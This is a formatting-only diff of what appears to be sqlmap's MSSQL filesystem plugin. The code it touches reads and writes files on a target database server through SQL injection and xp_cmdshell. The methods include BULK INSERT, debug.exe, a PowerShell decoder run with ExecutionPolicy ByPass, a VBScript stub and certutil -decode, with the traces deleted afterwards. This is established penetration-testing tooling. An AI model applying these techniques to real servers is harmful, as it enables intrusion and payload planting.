@@ -27,6 +27,7 @@ from lib.request import inject
 
 from plugins.generic.filesystem import Filesystem as GenericFilesystem
 
+
 class Filesystem(GenericFilesystem):
     def __init__(self):
         GenericFilesystem.__init__(self)
@@ -45,7 +46,7 @@ class Filesystem(GenericFilesystem):
         for fileLine in range(0, len(fileContent), lineLen):
             scrString = ""
 
-            for lineChar in fileContent[fileLine:fileLine + lineLen]:
+            for lineChar in fileContent[fileLine : fileLine + lineLen]:
                 strLineChar = hexencode(lineChar, conf.encoding)
 
                 if not scrString:
@@ -67,13 +68,22 @@ class Filesystem(GenericFilesystem):
         chunkName = randomStr(lowercase=True)
         fileScrLines = self._dataToScr(fileContent, chunkName)
 
-        logger.debug("uploading debug script to %s\%s, please wait.." % (tmpPath, randScr))
+        logger.debug(
+            "uploading debug script to %s\%s, please wait.." % (tmpPath, randScr)
+        )
 
         self.xpCmdshellWriteFile(fileScrLines, tmpPath, randScr)
 
-        logger.debug("generating chunk file %s\%s from debug script %s" % (tmpPath, chunkName, randScr))
+        logger.debug(
+            "generating chunk file %s\%s from debug script %s"
+            % (tmpPath, chunkName, randScr)
+        )
 
-        commands = ("cd \"%s\"" % tmpPath, "debug < %s" % randScr, "del /F /Q %s" % randScr)
+        commands = (
+            'cd "%s"' % tmpPath,
+            "debug < %s" % randScr,
+            "del /F /Q %s" % randScr,
+        )
         complComm = " & ".join(command for command in commands)
 
         self.execCmd(complComm)
@@ -90,10 +100,17 @@ class Filesystem(GenericFilesystem):
 
         self.createSupportTbl(txtTbl, self.tblField, "text")
         inject.goStacked("DROP TABLE %s" % hexTbl)
-        inject.goStacked("CREATE TABLE %s(id INT IDENTITY(1, 1) PRIMARY KEY, %s %s)" % (hexTbl, self.tblField, "VARCHAR(4096)"))
+        inject.goStacked(
+            "CREATE TABLE %s(id INT IDENTITY(1, 1) PRIMARY KEY, %s %s)"
+            % (hexTbl, self.tblField, "VARCHAR(4096)")
+        )
 
         logger.debug("loading the content of file '%s' into support table" % rFile)
-        inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (txtTbl, rFile, randomStr(10), randomStr(10)), silent=True)
+        inject.goStacked(
+            "BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')"
+            % (txtTbl, rFile, randomStr(10), randomStr(10)),
+            silent=True,
+        )
 
         # Reference: http://support.microsoft.com/kb/104829
         binToHexQuery = """DECLARE @charset VARCHAR(16)
@@ -132,17 +149,37 @@ class Filesystem(GenericFilesystem):
         BEGIN
             INSERT INTO %s(%s) VALUES(@hexstr)
         END
-        """ % (self.tblField, txtTbl, self.tblField, txtTbl, hexTbl, self.tblField, hexTbl, self.tblField)
+        """ % (
+            self.tblField,
+            txtTbl,
+            self.tblField,
+            txtTbl,
+            hexTbl,
+            self.tblField,
+            hexTbl,
+            self.tblField,
+        )
 
         binToHexQuery = binToHexQuery.replace("    ", "").replace("\n", " ")
         inject.goStacked(binToHexQuery)
 
         if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
-            result = inject.getValue("SELECT %s FROM %s ORDER BY id ASC" % (self.tblField, hexTbl), resumeValue=False, blind=False, time=False, error=False)
+            result = inject.getValue(
+                "SELECT %s FROM %s ORDER BY id ASC" % (self.tblField, hexTbl),
+                resumeValue=False,
+                blind=False,
+                time=False,
+                error=False,
+            )
 
         if not result:
             result = []
-            count = inject.getValue("SELECT COUNT(*) FROM %s" % (hexTbl), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
+            count = inject.getValue(
+                "SELECT COUNT(*) FROM %s" % (hexTbl),
+                resumeValue=False,
+                expected=EXPECTED.INT,
+                charsetType=CHARSET_TYPE.DIGITS,
+            )
 
             if not isNumPosStrValue(count):
                 errMsg = "unable to retrieve the content of the "
@@ -152,7 +189,20 @@ class Filesystem(GenericFilesystem):
             indexRange = getLimitRange(count)
 
             for index in indexRange:
-                chunk = inject.getValue("SELECT TOP 1 %s FROM %s WHERE %s NOT IN (SELECT TOP %d %s FROM %s ORDER BY id ASC) ORDER BY id ASC" % (self.tblField, hexTbl, self.tblField, index, self.tblField, hexTbl), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
+                chunk = inject.getValue(
+                    "SELECT TOP 1 %s FROM %s WHERE %s NOT IN (SELECT TOP %d %s FROM %s ORDER BY id ASC) ORDER BY id ASC"
+                    % (
+                        self.tblField,
+                        hexTbl,
+                        self.tblField,
+                        index,
+                        self.tblField,
+                        hexTbl,
+                    ),
+                    unpack=False,
+                    resumeValue=False,
+                    charsetType=CHARSET_TYPE.HEXADECIMAL,
+                )
                 result.append(chunk)
 
         inject.goStacked("DROP TABLE %s" % hexTbl)
@@ -179,25 +229,35 @@ class Filesystem(GenericFilesystem):
         wFileSize = len(encodedFileContent)
         chunkMaxSize = 1024
 
-        logger.debug("uploading the base64-encoded file to %s, please wait.." % encodedBase64FilePath)
+        logger.debug(
+            "uploading the base64-encoded file to %s, please wait.."
+            % encodedBase64FilePath
+        )
 
         for i in range(0, wFileSize, chunkMaxSize):
-            wEncodedChunk = encodedFileContent[i:i + chunkMaxSize]
+            wEncodedChunk = encodedFileContent[i : i + chunkMaxSize]
             self.xpCmdshellWriteFile(wEncodedChunk, tmpPath, encodedBase64File)
 
-        psString = "$Base64 = Get-Content -Path \"%s\"; " % encodedBase64FilePath
-        psString += "$Base64 = $Base64 -replace \"`t|`n|`r\",\"\"; $Content = "
+        psString = '$Base64 = Get-Content -Path "%s"; ' % encodedBase64FilePath
+        psString += '$Base64 = $Base64 -replace "`t|`n|`r",""; $Content = '
         psString += "[System.Convert]::FromBase64String($Base64); Set-Content "
-        psString += "-Path \"%s\" -Value $Content -Encoding Byte" % dFile
+        psString += '-Path "%s" -Value $Content -Encoding Byte' % dFile
 
-        logger.debug("uploading the PowerShell base64-decoding script to %s" % randPSScriptPath)
+        logger.debug(
+            "uploading the PowerShell base64-decoding script to %s" % randPSScriptPath
+        )
         self.xpCmdshellWriteFile(psString, tmpPath, randPSScript)
 
-        logger.debug("executing the PowerShell base64-decoding script to write the %s file, please wait.." % dFile)
+        logger.debug(
+            "executing the PowerShell base64-decoding script to write the %s file, please wait.."
+            % dFile
+        )
 
-        commands = ("powershell -ExecutionPolicy ByPass -File \"%s\"" % randPSScriptPath,
-                    "del /F /Q \"%s\"" % encodedBase64FilePath,
-                    "del /F /Q \"%s\"" % randPSScriptPath)
+        commands = (
+            'powershell -ExecutionPolicy ByPass -File "%s"' % randPSScriptPath,
+            'del /F /Q "%s"' % encodedBase64FilePath,
+            'del /F /Q "%s"' % randPSScriptPath,
+        )
         complComm = " & ".join(command for command in commands)
 
         self.execCmd(complComm)
@@ -215,11 +275,19 @@ class Filesystem(GenericFilesystem):
         if wFileSize < debugSize:
             chunkName = self._updateDestChunk(wFileContent, tmpPath)
 
-            debugMsg = "renaming chunk file %s\%s to %s " % (tmpPath, chunkName, fileType)
+            debugMsg = "renaming chunk file %s\%s to %s " % (
+                tmpPath,
+                chunkName,
+                fileType,
+            )
             debugMsg += "file %s\%s and moving it to %s" % (tmpPath, dFileName, dFile)
             logger.debug(debugMsg)
 
-            commands = ("cd \"%s\"" % tmpPath, "ren %s %s" % (chunkName, dFileName), "move /Y %s %s" % (dFileName, dFile))
+            commands = (
+                'cd "%s"' % tmpPath,
+                "ren %s %s" % (chunkName, dFileName),
+                "move /Y %s %s" % (dFileName, dFile),
+            )
             complComm = " & ".join(command for command in commands)
 
             self.execCmd(complComm)
@@ -231,7 +299,7 @@ class Filesystem(GenericFilesystem):
             logger.debug(debugMsg)
 
             for i in range(0, wFileSize, debugSize):
-                wFileChunk = wFileContent[i:i + debugSize]
+                wFileChunk = wFileContent[i : i + debugSize]
                 chunkName = self._updateDestChunk(wFileChunk, tmpPath)
 
                 if i == 0:
@@ -241,17 +309,23 @@ class Filesystem(GenericFilesystem):
                     debugMsg = "appending chunk "
                     copyCmd = "copy /B /Y %s+%s %s" % (dFileName, chunkName, dFileName)
 
-                debugMsg += "%s\%s to %s file %s\%s" % (tmpPath, chunkName, fileType, tmpPath, dFileName)
+                debugMsg += "%s\%s to %s file %s\%s" % (
+                    tmpPath,
+                    chunkName,
+                    fileType,
+                    tmpPath,
+                    dFileName,
+                )
                 logger.debug(debugMsg)
 
-                commands = ("cd \"%s\"" % tmpPath, copyCmd, "del /F /Q %s" % chunkName)
+                commands = ('cd "%s"' % tmpPath, copyCmd, "del /F /Q %s" % chunkName)
                 complComm = " & ".join(command for command in commands)
 
                 self.execCmd(complComm)
 
             logger.debug("moving %s file %s to %s" % (fileType, sFile, dFile))
 
-            commands = ("cd \"%s\"" % tmpPath, "move /Y %s %s" % (dFileName, dFile))
+            commands = ('cd "%s"' % tmpPath, "move /Y %s %s" % (dFileName, dFile))
             complComm = " & ".join(command for command in commands)
 
             self.execCmd(complComm)
@@ -322,22 +396,33 @@ class Filesystem(GenericFilesystem):
         vbs = vbs.replace("    ", "")
         encodedFileContent = base64encode(wFileContent)
 
-        logger.debug("uploading the file base64-encoded content to %s, please wait.." % randFilePath)
+        logger.debug(
+            "uploading the file base64-encoded content to %s, please wait.."
+            % randFilePath
+        )
 
         self.xpCmdshellWriteFile(encodedFileContent, tmpPath, randFile)
 
-        logger.debug("uploading a visual basic decoder stub %s\%s, please wait.." % (tmpPath, randVbs))
+        logger.debug(
+            "uploading a visual basic decoder stub %s\%s, please wait.."
+            % (tmpPath, randVbs)
+        )
 
         self.xpCmdshellWriteFile(vbs, tmpPath, randVbs)
 
-        commands = ("cd \"%s\"" % tmpPath, "cscript //nologo %s" % randVbs,
-                     "del /F /Q %s" % randVbs,
-                     "del /F /Q %s" % randFile)
+        commands = (
+            'cd "%s"' % tmpPath,
+            "cscript //nologo %s" % randVbs,
+            "del /F /Q %s" % randVbs,
+            "del /F /Q %s" % randFile,
+        )
         complComm = " & ".join(command for command in commands)
 
         self.execCmd(complComm)
 
-    def _stackedWriteFileCertutilExe(self, tmpPath, wFile, wFileContent, dFile, fileType):
+    def _stackedWriteFileCertutilExe(
+        self, tmpPath, wFile, wFileContent, dFile, fileType
+    ):
         infoMsg = "using certutil.exe to write the %s " % fileType
         infoMsg += "file content to file '%s', please wait.." % dFile
         logger.info(infoMsg)
@@ -349,16 +434,27 @@ class Filesystem(GenericFilesystem):
 
         encodedFileContent = base64encode(wFileContent)
 
-        splittedEncodedFileContent = '\n'.join([encodedFileContent[i:i+chunkMaxSize] for i in range(0, len(encodedFileContent), chunkMaxSize)])
+        splittedEncodedFileContent = "\n".join(
+            [
+                encodedFileContent[i : i + chunkMaxSize]
+                for i in range(0, len(encodedFileContent), chunkMaxSize)
+            ]
+        )
 
-        logger.debug("uploading the file base64-encoded content to %s, please wait.." % randFilePath)
+        logger.debug(
+            "uploading the file base64-encoded content to %s, please wait.."
+            % randFilePath
+        )
 
         self.xpCmdshellWriteFile(splittedEncodedFileContent, tmpPath, randFile)
 
         logger.debug("decoding the file to %s.." % dFile)
 
-        commands = ("cd \"%s\"" % tmpPath, "certutil -f -decode %s %s" % (randFile, dFile),
-                     "del /F /Q %s" % randFile)
+        commands = (
+            'cd "%s"' % tmpPath,
+            "certutil -f -decode %s %s" % (randFile, dFile),
+            "del /F /Q %s" % randFile,
+        )
         complComm = " & ".join(command for command in commands)
 
         self.execCmd(complComm)
@@ -383,7 +479,7 @@ class Filesystem(GenericFilesystem):
             message = "do you want to try to upload the file with "
             message += "the custom Visual Basic script technique? [Y/n] "
 
-            if readInput(message, default='Y', boolean=True):
+            if readInput(message, default="Y", boolean=True):
                 self._stackedWriteFileVbs(tmpPath, wFileContent, dFile, fileType)
                 written = self.askCheckWrittenFile(wFile, dFile, forceCheck)
 
@@ -391,16 +487,20 @@ class Filesystem(GenericFilesystem):
             message = "do you want to try to upload the file with "
             message += "the built-in debug.exe technique? [Y/n] "
 
-            if readInput(message, default='Y', boolean=True):
-                self._stackedWriteFileDebugExe(tmpPath, wFile, wFileContent, dFile, fileType)
+            if readInput(message, default="Y", boolean=True):
+                self._stackedWriteFileDebugExe(
+                    tmpPath, wFile, wFileContent, dFile, fileType
+                )
                 written = self.askCheckWrittenFile(wFile, dFile, forceCheck)
 
         if written is False:
             message = "do you want to try to upload the file with "
             message += "the built-in certutil.exe technique? [Y/n] "
 
-            if readInput(message, default='Y', boolean=True):
-                self._stackedWriteFileCertutilExe(tmpPath, wFile, wFileContent, dFile, fileType)
+            if readInput(message, default="Y", boolean=True):
+                self._stackedWriteFileCertutilExe(
+                    tmpPath, wFile, wFileContent, dFile, fileType
+                )
                 written = self.askCheckWrittenFile(wFile, dFile, forceCheck)
 
         return written
